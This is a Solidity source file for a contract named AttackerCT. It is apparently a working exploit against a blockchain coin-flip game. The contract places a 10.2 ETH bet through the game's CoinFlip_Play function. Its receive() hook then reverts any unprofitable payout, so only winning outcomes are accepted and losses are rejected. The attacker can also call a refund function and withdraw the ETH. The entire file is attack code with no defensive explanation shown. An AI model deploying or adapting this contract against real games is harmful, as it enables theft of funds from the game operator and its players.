pragma solidity ^0.8.0;

contract AttackerCT {
    address public owner;
    address public gameContract;

    // During initialization, input 11 ETH as the initial fund
    constructor(address _gameContract) payable {
        owner = msg.sender;
        gameContract = _gameContract;
    }

    function enterGame() public {
        uint wager = 1 ether;
        address tokenAddress = address(0);
        bool isHead = true;
        uint numBets = 10;
        uint stopGain = 100 ether;
        uint stopLoss = 4 ether;
        // transfer Additional 0.2 ether as fee
        (bool success, bytes memory data) = gameContract.call{
            value: 10.2 ether
        }(
            abi.encodeWithSignature(
                "CoinFlip_Play(uint256,address,bool,uint32,uint256,uint256)",
                wager,
                tokenAddress,
                isHead,
                numBets,
                stopGain,
                stopLoss
            )
        );
        require(success, "enterGame(); failed");
    }

    function refundAsset() public {
        (bool success, bytes memory data) = gameContract.call(
            abi.encodeWithSignature("CoinFlip_Refund()")
        );
        require(success, "refund failed");
    }

    function withdrawETH() public {
        payable(owner).transfer(address(this).balance);
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        // If the game is not profitable, revert the transaction
        require(msg.value >= 10 ether || msg.value < 0.2 ether);
    }
}
